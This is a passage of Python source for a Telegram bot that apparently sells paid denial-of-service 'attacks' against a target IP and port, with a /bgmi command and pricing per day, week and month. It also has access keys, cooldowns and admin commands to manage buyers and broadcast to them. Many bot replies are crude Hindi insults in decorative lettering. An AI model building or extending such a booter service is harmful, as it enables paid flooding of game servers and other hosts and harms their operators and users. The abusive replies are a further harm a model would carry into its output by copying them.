def show_recent_logs(message):
    user_id = message.chat.id
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
                logger.info(f"Admin {user_id} downloaded logs")
            except FileNotFoundError:
                response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃."
                bot.reply_to(message, response)
        else:
            response = "𝐀𝐣𝐢 𝐥𝐚𝐧𝐝 𝐦𝐞𝐫𝐚 𝐌𝐄𝐑𝐀 𝐍𝐎 𝐃𝐀𝐓𝐀 𝐅𝐎𝐔𝐍𝐃"
            bot.reply_to(message, response)
    else:
        response = "𝐁𝐇𝐀𝐆𝐉𝐀 𝐁𝐒𝐃𝐊 𝐎𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐀𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = message.chat.id
    response = f"𝐋𝐄 𝐑𝐄 𝐋𝐔𝐍𝐃 𝐊𝐄 𝐓𝐄𝐑𝐈 𝐈𝐃: {user_id}"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "𝐋𝐞 𝐫𝐞 𝐋𝐮𝐧𝐝 𝐤𝐞 𝐘𝐞 𝐭𝐞𝐫𝐢 𝐟𝐢𝐥𝐞:\n" + "".join(user_logs[-20:])
                else:
                    response = "𝐔𝐒𝐄 𝐊𝐑𝐋𝐄 𝐏𝐄𝐇𝐋𝐄 𝐅𝐈𝐑 𝐍𝐈𝐊𝐀𝐋𝐔𝐍𝐆𝐀 𝐓𝐄𝐑𝐈 𝐅𝐈𝐋𝐄."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝐘𝐄 𝐆𝐀𝐑𝐄𝐄𝐁 𝐄𝐒𝐊𝐈 𝐌𝐀𝐊𝐈 𝐂𝐇𝐔𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐇𝐈 𝐍𝐀𝐇𝐈 𝐇 𝐄𝐒𝐊𝐄 𝐏𝐀𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = message.chat.id
    help_text = f'''𝐌𝐄𝐑𝐀 𝐋𝐀𝐍𝐃 𝐊𝐀𝐑𝐄 𝐇𝐄𝐋𝐏 𝐓𝐄𝐑𝐈 𝐋𝐄 𝐅𝐈𝐑 𝐁𝐇𝐈 𝐁𝐀𝐓𝐀 𝐃𝐄𝐓𝐀:
💥 /bgmi <IP> <PORT> <TIME> - 𝐒𝐓𝐀𝐑𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 (𝐌𝐀𝐗 {config['max_attack_time']}𝐒)
💥 /status - 𝐂𝐇𝐄𝐂𝐊 𝐒𝐘𝐒𝐓𝐄𝐌 𝐒𝐓𝐀𝐓𝐔𝐒
💥 /rules - 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐄 𝐑𝐔𝐋𝐄𝐒
💥 /mylogs - 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐇𝐈𝐒𝐓𝐎𝐑𝐘
💥 /plan - 𝐕𝐈𝐄𝐖 𝐏𝐑𝐈𝐂𝐈𝐍𝐆
💥 /redeem <key> - 𝐑𝐄𝐃𝐄𝐄𝐌 𝐀𝐂𝐂𝐄𝐒𝐒 𝐊𝐄𝐘

🤖 Admin commands:
💥 /genkey <amount> <hours/days>
💥 /allusers
💥 /logs
💥 /clearlogs
💥 /broadcast <message>
💥 /remove <user_id>
'''
    
    if user_id in admin_id:
        help_text += f'''
⚙️ Admin Config commands:
💥 /setmaxtime <seconds> - Set max attack time (current: {config['max_attack_time']}s)
💥 /setusercooldown <seconds> - Set user cooldown (current: {config['user_cooldown_time']}s)
💥 /setglobalcooldown <seconds> - Set global cooldown (current: {config['global_cooldown_time']}s)
💥 /admincmd - View all admin commands
'''
    
    help_text += f'''
⚙️ 𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬:
🔹 Max Concurrent: {config['global_max_concurrent']}
🔹 Max Attack Time: {config['max_attack_time']}s
🔹 User Cooldown: {config['user_cooldown_time']}s
🔹 Global Cooldown: {config['global_cooldown_time']}s
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝐐 𝐫𝐞 𝐂𝐇𝐀𝐏𝐑𝐈, {user_name}! 𝐓𝐡𝐢𝐬 𝐢𝐒 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐑𝐞𝐫𝐒 𝐁𝐨𝐭 𝐒𝐞𝐫𝐯𝐢𝐜𝐞.
🤖𝐀𝐍𝐏𝐀𝐃 𝐔𝐒𝐄 𝐇𝐄𝐋𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃: /help

⚡ Max Concurrent: {config['global_max_concurrent']}
⚡ Max Attack Time: {config['max_attack_time']}s
⚡ User Cooldown: {config['user_cooldown_time']}s
⚡ Global Cooldown: {config['global_cooldown_time']}s
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐅𝐎𝐋𝐋𝐎𝐖 𝐓𝐇𝐈𝐒 𝐑𝐔𝐋𝐄𝐒:

1. Max {config['global_max_concurrent']} attack(s) allowed at a time globally
2. User cooldown: {config['user_cooldown_time']} seconds between attacks
3. Global cooldown: {config['global_cooldown_time']} seconds between attacks
4. Max attack time: {config['max_attack_time']} seconds
5. Follow admin instructions
'''
    bot.reply_to(message, response)
@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀:

VIP 🌟:
-> Attack time: {config['max_attack_time']} seconds max
-> Concurrent attacks: Up to {config['global_max_concurrent']}
-> User cooldown: {config['user_cooldown_time']} seconds
-> 24/7 Access

𝐏𝐑𝐈𝐂𝐈𝐍𝐆:
𝐃𝐚𝐲: 150 𝐫𝐬
𝐖𝐞𝐞𝐤: 600 𝐫𝐬
𝐌𝐨𝐧𝐭𝐡: 1100 𝐫𝐬 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:

💥 /genkey - Generate key
💥 /allusers - List users
💥 /logs - Get logs file
💥 /clearlogs - Clear logs
💥 /broadcast - Send message
💥 /remove - Remove user
💥 /status - Check current attack status

⚙️ Config Commands:
💥 /setmaxtime <seconds> - Set max attack time
💥 /setusercooldown <seconds> - Set user cooldown
💥 /setglobalcooldown <seconds> - Set global cooldown
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            if target_user_id in users:
                del users[target_user_id]
                save_users()
                response = f"𝐔𝐬𝐞𝐫 {target_user_id} 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐅𝐮𝐂𝐤𝐞𝐃."
                logger.info(f"Admin {user_id} removed user {target_user_id}")
            else:
                response = "𝐋𝐎𝐋 𝐮𝐬𝐞𝐫 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝😂"
        else:
            response = "Usage: /remove <user_id>"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒"

    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.chat.id
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐄𝐑:\n\n" + command[1]
            sent_count = 0
            for user_id_str in users:
                try:
                    bot.send_message(user_id_str, message_to_broadcast)
                    sent_count += 1
                except Exception as e:
                    logger.error(f"Failed to send broadcast to {user_id_str}: {str(e)}")
            response = f"Broadcast sent to {sent_count} users 👍."
            logger.info(f"Admin {user_id} broadcasted message to {sent_count} users")
        else:
            response = "𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 𝐊𝐄 𝐋𝐈𝐘𝐄 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐓𝐎 𝐋𝐈𝐊𝐇𝐃𝐄 𝐆𝐀𝐍𝐃𝐔"
    else:
        response = "𝐎𝐍𝐋𝐘 𝐁𝐎𝐓 𝐊𝐄 𝐏𝐄𝐄𝐓𝐀𝐉𝐈 𝐂𝐀𝐍 𝐑𝐔𝐍 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃"

    bot.reply_to(message, response)

if __name__ == "__main__":
    load_data()
    logger.info("="*50)
    logger.info("🤖 BOT STARTING...")
    logger.info(f"⚡ Max Concurrent Attacks: {config['global_max_concurrent']}")
    logger.info(f"⚡ Max Attack Time: {config['max_attack_time']}s")
    logger.info(f"⚡ User Cooldown: {config['user_cooldown_time']}s | Global Cooldown: {config['global_cooldown_time']}s")
    logger.info("🔄 Infinite retry mode enabled")
    logger.info("🔒 API details hidden from users")
    logger.info("="*50)

    bot.infinity_polling()
    #run_bot_forever()
